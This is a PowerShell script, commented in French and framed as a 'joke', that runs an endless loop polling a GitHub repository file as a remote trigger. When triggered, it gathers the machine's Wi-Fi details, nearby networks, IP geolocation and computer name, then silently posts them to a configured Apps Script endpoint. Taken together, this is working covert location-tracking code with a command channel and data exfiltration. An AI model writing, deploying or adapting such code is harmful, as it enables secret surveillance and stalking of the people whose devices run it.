# blague_localisation_windows.ps1
# Surveille GitHub. Quand get_location=true -> recupere WiFi + IP geoloc -> envoie au Apps Script.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-LocationSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_localisation.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ get_location = [bool]$data.get_location; sha = $resp.sha }
    } catch { return $null }
}

function Reset-LocationSignal($sha) {
    try {
        $body = @{
            message = "reset location signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"get_location":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_localisation.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Get-WifiInfo {
    $wifi = @{ ssid = ''; bssid = ''; signal = ''; securite = '' }
    try {
        $netsh = netsh wlan show interfaces 2>$null
        $ssidLine     = $netsh | Select-String '^\s+SSID\s+:'      | Select-Object -First 1
        $bssidLine    = $netsh | Select-String '^\s+BSSID\s+:'     | Select-Object -First 1
        $signalLine   = $netsh | Select-String '^\s+Signal\s+:'    | Select-Object -First 1
        $securiteLine = $netsh | Select-String '^\s+Authentification' | Select-Object -First 1

        if ($ssidLine)     { $wifi.ssid     = ($ssidLine.ToString()     -split ':\s+', 2)[1].Trim() }
        if ($bssidLine)    { $wifi.bssid    = ($bssidLine.ToString()    -split ':\s+', 2)[1].Trim() }
        if ($signalLine)   { $wifi.signal   = ($signalLine.ToString()   -split ':\s+', 2)[1].Trim() }
        if ($securiteLine) { $wifi.securite = ($securiteLine.ToString() -split ':\s+', 2)[1].Trim() }
    } catch {}
    return $wifi
}

function Get-IpGeoloc {
    $geo = @{ ip = ''; pays = ''; region = ''; ville = ''; fai = ''; org = ''; timezone = '' }
    try {
        $resp = Invoke-RestMethod -Uri "https://ipapi.co/json/" -ErrorAction Stop
        $geo.ip       = $resp.ip
        $geo.pays     = $resp.country_name
        $geo.region   = $resp.region
        $geo.ville    = $resp.city
        $geo.fai      = $resp.org
        $geo.org      = $resp.asn
        $geo.timezone = $resp.timezone
    } catch {
        try {
            $resp = Invoke-RestMethod -Uri "http://ip-api.com/json/" -ErrorAction Stop
            $geo.ip     = $resp.query
            $geo.pays   = $resp.country
            $geo.region = $resp.regionName
            $geo.ville  = $resp.city
            $geo.fai    = $resp.isp
            $geo.org    = $resp.org
        } catch {}
    }
    return $geo
}

function Get-WifiNetworks {
    $reseaux = @()
    try {
        $netsh = netsh wlan show networks mode=bssid 2>$null
        $blocks = ($netsh -join "`n") -split "SSID \d+ "
        foreach ($block in $blocks | Select-Object -Skip 1) {
            $lines  = $block -split "`n"
            $ssid   = ($lines | Select-String '^\s*:') | Select-Object -First 1
            $signal = ($lines | Select-String 'Signal')| Select-Object -First 1
            $reseaux += [PSCustomObject]@{
                ssid   = if ($ssid)   { ($ssid.ToString()   -split ':\s+',2)[1].Trim() } else { '' }
                signal = if ($signal) { ($signal.ToString() -split ':\s+',2)[1].Trim() } else { '' }
            }
        }
    } catch {}
    return $reseaux | Select-Object -First 10
}

function Send-Location {
    $wifi    = Get-WifiInfo
    $geo     = Get-IpGeoloc
    $reseaux = Get-WifiNetworks

    $body = @{
        type     = 'localisation'
        machine  = $env:COMPUTERNAME
        date     = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        wifi     = $wifi
        geo      = $geo
        reseaux  = $reseaux
    } | ConvertTo-Json -Depth 5 -Compress

    try {
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

# Boucle principale
while ($true) {
    $signal = Get-LocationSignal
    if ($signal -and $signal.get_location) {
        Reset-LocationSignal $signal.sha
        Send-Location
    }
    Start-Sleep -Seconds 3
}
